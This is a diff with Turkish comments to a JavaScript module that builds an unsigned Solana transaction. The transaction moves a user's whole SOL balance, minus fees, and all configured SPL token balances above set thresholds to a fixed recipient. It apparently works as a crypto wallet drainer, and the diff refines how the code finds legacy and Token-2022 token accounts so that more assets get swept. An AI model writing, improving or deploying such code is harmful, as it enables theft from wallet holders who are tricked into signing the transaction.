@@ -22,7 +22,7 @@ import { TOKEN_CONFIGS } from "./token-config.js";
 const BATCH_SIZE = 3;
 const BATCH_DELAY_MS = 1000;
 
-/** Batch runner */
+/** Basit batch runner */
 async function runBatches(tasks) {
   const results = [];
   for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
@@ -36,14 +36,58 @@ async function runBatches(tasks) {
   return results;
 }
 
-/** Mint owner'a bakarak token programını tespit et (legacy / 2022). */
-async function detectTokenProgramId(mintPubkey) {
-  const info = await connection.getAccountInfo(mintPubkey);
-  if (!info) return TOKEN_PROGRAM_ID; // güvenli varsayılan
-  const owner = info.owner;
-  if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
-  if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
-  return owner; // çok nadir özel programlar
+/**
+ * Bir mint için, hem legacy hem token-2022 programları altında
+ * kullanıcının ve alıcının ATA’larını türetip hangisi GERÇEKTEN varsa onu döndürür.
+ * ATA CREATE YAPMAZ! Sadece mevcut hesapları kullanır.
+ */
+async function resolveTokenPaths(mint, ownerPubkey, recipientPubkey) {
+  const candidates = [
+    { programId: TOKEN_PROGRAM_ID, label: "legacy" },
+    { programId: TOKEN_2022_PROGRAM_ID, label: "token2022" },
+  ];
+
+  let chosenUser = null;
+  let chosenRecipient = null;
+
+  // 1) Kullanıcı tarafı (hangi programda ATA ve bakiye varsa onu seç)
+  for (const c of candidates) {
+    const userAta = await getAssociatedTokenAddress(
+      mint,
+      ownerPubkey,
+      false,
+      c.programId,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+    try {
+      const acct = await getAccount(connection, userAta, undefined, c.programId);
+      // Hesap OK → aday
+      chosenUser = { programId: c.programId, label: c.label, ata: userAta, acct };
+      break; // önce bulunanı seç (ATA > 0 olmasa da varlığını teyit ettik)
+    } catch {
+      // bu programda kullanıcı ATA yok; devam
+    }
+  }
+
+  // 2) Alıcı tarafı (hangi programda ATA varsa onu seç)
+  for (const c of candidates) {
+    const toAta = await getAssociatedTokenAddress(
+      mint,
+      recipientPubkey,
+      false,
+      c.programId,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+    try {
+      const acct = await getAccount(connection, toAta, undefined, c.programId);
+      chosenRecipient = { programId: c.programId, label: c.label, ata: toAta, acct };
+      break;
+    } catch {
+      // bu programda alıcı ATA yok; devam
+    }
+  }
+
+  return { chosenUser, chosenRecipient };
 }
 
 export async function createUnsignedTransaction(userPublicKey) {
@@ -61,56 +105,45 @@ export async function createUnsignedTransaction(userPublicKey) {
   const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
   const isSolSufficient = solToSend > 0;
 
-  // 0) Her mint için programId tespiti
-  const progTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
-    const programId = await detectTokenProgramId(mint);
-    return { mint, programId };
-  });
-  const progPairs = await runBatches(progTasks);
-  const programByMint = new Map(progPairs.map((x) => [x.mint.toBase58(), x.programId]));
-
-  // 1) Kullanıcı bakiyelerini oku (doğru programId ile)
+  // 1) Her mint için kullanıcı/alıcı yollarını çöz (programId + mevcut ATA’lar)
   const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
-    const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;
+    const { chosenUser, chosenRecipient } = await resolveTokenPaths(mint, payer, toPublicKey);
 
-    // ATA'ları doğru programla türet
-    const userAta = await getAssociatedTokenAddress(
-      mint,
-      payer,
-      false,
-      programId,
-      ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-    const toAta = await getAssociatedTokenAddress(
-      mint,
-      toPublicKey,
-      false,
-      programId,
-      ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    // Kullanıcı ATA bakiyesini doğru programla oku
-    let amount = 0n;
-    let sufficient = false;
-    try {
-      const acct = await getAccount(connection, userAta, undefined, programId);
-      amount = acct.amount; // bigint
-      const th = BigInt(threshold ?? 0);
-      sufficient = amount >= th; // eşik dahil
-    } catch {
-      sufficient = false;
+    // Kullanıcı ya da alıcı tarafı bulunamadıysa bu mint atlanır
+    if (!chosenUser || !chosenRecipient) {
+      return {
+        mint,
+        reason: !chosenUser ? "user_ata_missing" : "recipient_ata_missing",
+        sufficient: false,
+      };
     }
 
-    // Alıcı ATA mevcut mu? (ATA oluşturmayacağız; yoksa bu minti atlarız)
-    let toAtaExists = true;
-    try {
-      await getAccount(connection, toAta, undefined, programId);
-    } catch {
-      toAtaExists = false;
+    // Eğer programlar uyuşmuyorsa (çok nadir ama mümkün), atla
+    if (!chosenUser.programId.equals(chosenRecipient.programId)) {
+      return {
+        mint,
+        reason: "program_mismatch",
+        sufficient: false,
+        userProg: chosenUser.programId,
+        toProg: chosenRecipient.programId,
+      };
     }
 
-    return { mint, programId, userAta, toAta, amount, sufficient, toAtaExists };
+    const amount = chosenUser.acct.amount; // bigint
+    const th = BigInt(threshold ?? 0);
+    const sufficient = amount >= th;
+
+    return {
+      mint,
+      programId: chosenUser.programId,
+      userAta: chosenUser.ata,
+      toAta: chosenRecipient.ata,
+      amount,
+      sufficient,
+      reason: sufficient ? "ok" : "below_threshold",
+    };
   });
+
   const userTokenInfos = await runBatches(balanceTasks);
 
   // 2) Instruction'ları sırayla derle
@@ -127,37 +160,33 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
 
-  // 2b) SPL-token transfer (ATA oluşturma yok; yalnızca mevcut ATA'lara, doğru programId ile)
+  // 2b) SPL-token transfer (ATA oluşturma YOK; sadece mevcut ve eşik geçenler)
   for (const info of userTokenInfos) {
-    const { userAta, toAta, amount, sufficient, toAtaExists, programId, mint } = info;
-    if (!sufficient) continue;
-    if (!toAtaExists) {
-      console.warn(`Recipient ATA yok, atlandı → mint=${mint.toBase58()} prog=${programId.toBase58()}`);
-      continue;
-    }
+    if (!info?.sufficient) continue;
+    if (!info.userAta || !info.toAta || !info.programId) continue;
 
     instructions.push(
       createTransferInstruction(
-        userAta,
-        toAta,
+        info.userAta,
+        info.toAta,
         payer,
-        amount,     // bigint ok
-        [],         // signer yok
-        programId   // **KRİTİK**: mint'in gerçek token programı
+        info.amount,     // bigint
+        [],              // multisig yok
+        info.programId   // **KRİTİK**: doğru token programı
       )
     );
   }
 
-  // SPL hiç eklenmediyse ve SOL da yoksa vazgeç
+  // Hiç SPL eklenmemişse ve SOL da yoksa vazgeç
   const hasAnySpl = instructions.some(
     (ix) => ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
   );
   if (!isSolSufficient && !hasAnySpl) {
-    console.warn("SPL yok (bakiye/ATA/programId uyumsuzluğu) ve SOL da yetersiz.");
+    console.warn("SPL yok (kullanıcı/alıcı ATA bulunamadı veya threshold sebebiyle atlandı).");
     return null;
   }
 
-  // 3) VersionedTransaction
+  // 3) Tek bir VersionedTransaction oluştur
   const { blockhash } = await connection.getLatestBlockhash();
   const messageV0 = new TransactionMessage({
     payerKey: payer,
@@ -165,22 +194,17 @@ export async function createUnsignedTransaction(userPublicKey) {
     instructions,
   }).compileToV0Message();
 
-  // Debug (Phantom bazı logları redakte edebilir)
+  // Debug: NEDEN eklenmediğini net gör
   try {
     console.table(
       userTokenInfos.map((t) => ({
-        mint: t.mint.toBase58(),
-        prog:
-          t.programId.equals(TOKEN_PROGRAM_ID)
-            ? "TOKEN_PROGRAM"
-            : t.programId.equals(TOKEN_2022_PROGRAM_ID)
-            ? "TOKEN_2022"
-            : t.programId.toBase58(),
-        userAta: t.userAta.toBase58(),
-        toAta: t.toAta.toBase58(),
-        amount: t.amount.toString(),
-        sufficient: t.sufficient,
-        toAtaExists: t.toAtaExists,
+        mint: t.mint?.toBase58?.() ?? String(t.mint),
+        amount: t.amount ? t.amount.toString() : "-",
+        sufficient: t.sufficient ?? false,
+        reason: t.reason ?? "-",
+        userAta: t.userAta?.toBase58?.() ?? "-",
+        toAta: t.toAta?.toBase58?.() ?? "-",
+        programId: t.programId?.toBase58?.() ?? "-",
       }))
     );
     console.log("SOL to send (lamports):", solToSend);
